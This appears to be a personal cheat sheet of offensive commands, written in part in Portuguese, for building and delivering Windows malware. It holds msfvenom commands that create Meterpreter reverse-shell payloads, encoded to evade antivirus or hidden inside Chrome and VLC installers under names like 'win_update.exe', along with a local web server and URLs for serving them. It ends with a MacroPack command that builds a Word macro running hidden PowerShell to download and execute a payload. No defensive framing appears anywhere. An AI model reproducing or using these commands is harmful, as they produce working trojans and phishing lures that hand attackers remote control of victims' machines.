msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.137 LPORT=443 -f exe -x ChromeSetup.exe -o chrome_infectado.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<seu_ip> LPORT=443 -f exe -x vlc_setup.exe -o vlc_infectado.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

http://192.168.1.137:8080/vlc_infectado.exe

http://192.168.1.137:8080/documento_infectado.rtf

http://192.168.1.137/payloads/relatorio_seguranca.exe

http://192.168.1.137:8080/microsoft_update.page.zip

MacroPack

wget https://get.videolan.org/vlc/3.0.20/win64/vlc-3.0.20-win64.exe -O vlc_setup.exe

set PAYLOAD windows/x64/meterpreter/reverse_https

python3 macro_pack.py -t D -G -o windows_update.docm -p "powershell -w hidden -c Invoke-WebRequest -Uri http://<SEU_IP>:8080/payload.exe -OutFile C:\\Users\\Public\\update.exe; Start-Process C:\\Users\\Public\\update.exe"
